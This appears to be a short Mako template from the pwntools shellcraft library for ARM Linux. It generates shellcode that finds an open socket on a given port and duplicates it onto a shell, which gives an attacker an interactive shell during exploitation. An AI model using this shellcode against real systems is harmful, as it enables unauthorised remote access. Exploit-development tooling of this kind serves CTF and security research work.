<% from pwnlib.shellcraft import arm, common %>
<% from pwnlib.util.misc import binary_ip %>
<% from pwnlib.util.packing import u32 %>
<%page args="port=None"/>
<%docstring>
Args: port (defaults to any)
    Finds an open socket which connects to a specified
	port, and then opens a dup2 shell on it.
</%docstring>

${arm.linux.findpeer(port)}
${arm.linux.dupsh('r0')}
